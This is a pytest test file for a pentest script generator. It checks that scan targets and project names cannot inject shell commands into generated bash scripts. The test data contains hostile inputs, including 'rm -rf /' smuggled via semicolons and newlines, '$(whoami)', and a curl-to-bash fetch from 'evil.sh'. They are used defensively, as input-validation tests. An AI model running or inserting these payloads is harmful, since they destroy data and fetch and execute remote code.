"""Tests for services/script_generator.py's template rendering and the
input validation it depends on to stay injection-safe -- the generated
script is executed as-is (see services/executor.py:run_command_streaming),
so a project name or target that could break out of a `#` comment or a
shell argument is a command-injection path, not just a cosmetic bug.
"""
import pytest

from services.script_generator import generate_script, _validate_target, _single_line


def test_validate_target_accepts_ip_and_hostname():
    assert _validate_target("10.0.0.5") == "10.0.0.5"
    assert _validate_target("scanme.example.com") == "scanme.example.com"


@pytest.mark.parametrize("bad_target", [
    "10.0.0.1; rm -rf /",
    "10.0.0.1 && curl evil.sh | bash",
    "$(whoami)",
    "`id`",
    "10.0.0.1\nrm -rf /",
])
def test_validate_target_rejects_shell_metacharacters(bad_target):
    with pytest.raises(ValueError):
        _validate_target(bad_target)


def test_single_line_strips_embedded_newline_to_prevent_comment_breakout():
    malicious = "My Project\n# fake comment\nrm -rf /"
    sanitized = _single_line(malicious)
    assert "\n" not in sanitized
    # The payload's bytes are still present (as a single line), just inert --
    # a trailing shell command can no longer land outside the comment it's
    # interpolated into.
    assert "rm -rf /" in sanitized


def test_generate_script_renders_network_discovery_with_validated_values():
    script = generate_script(
        project_name="Acme Pentest",
        target="10.0.0.5",
        scan_categories=[{
            "category_id": "network_discovery",
            "config": {"scan_type": "SYN (-sS)", "port_range": "1-1000", "timing": "T3 (Normal)"},
        }],
    )
    assert script.startswith("#!/usr/bin/env bash")
    assert "set -euo pipefail" in script
    assert "Target:  10.0.0.5" in script
    assert "nmap -sS" in script
    assert "-p 1-1000" in script
    assert "--timing -T3" in script


def test_generate_script_rejects_invalid_target_before_touching_templates():
    with pytest.raises(ValueError):
        generate_script(
            project_name="x",
            target="10.0.0.1; rm -rf /",
            scan_categories=[{"category_id": "network_discovery", "config": {}}],
        )


def test_generate_script_skips_unknown_category_silently():
    script = generate_script(
        project_name="x",
        target="10.0.0.5",
        scan_categories=[{"category_id": "not_a_real_category", "config": {}}],
    )
    # Header still renders; no template exists for the bogus category, so
    # nothing beyond the shared header/preamble is emitted for it -- this
    # must not raise.
    assert script.startswith("#!/usr/bin/env bash")
    assert "nmap" not in script


def test_generate_script_concatenates_multiple_categories():
    script = generate_script(
        project_name="x",
        target="10.0.0.5",
        scan_categories=[
            {"category_id": "network_discovery", "config": {}},
            {"category_id": "web_audit", "config": {}},
        ],
    )
    assert "Network Discovery" in script
    assert "nikto" in script.lower()


def test_generate_script_sanitizes_project_name_with_embedded_newline():
    malicious_name = "x\n# injected\nrm -rf /"
    script = generate_script(
        project_name=malicious_name,
        target="10.0.0.5",
        scan_categories=[{"category_id": "network_discovery", "config": {}}],
    )
    # The comment header line for "# Project: ..." must stay exactly one
    # line -- the injected payload must not have broken onto its own line.
    header_lines = [l for l in script.splitlines() if l.startswith("# Project:")]
    assert len(header_lines) == 1
    assert "rm -rf /" in header_lines[0]
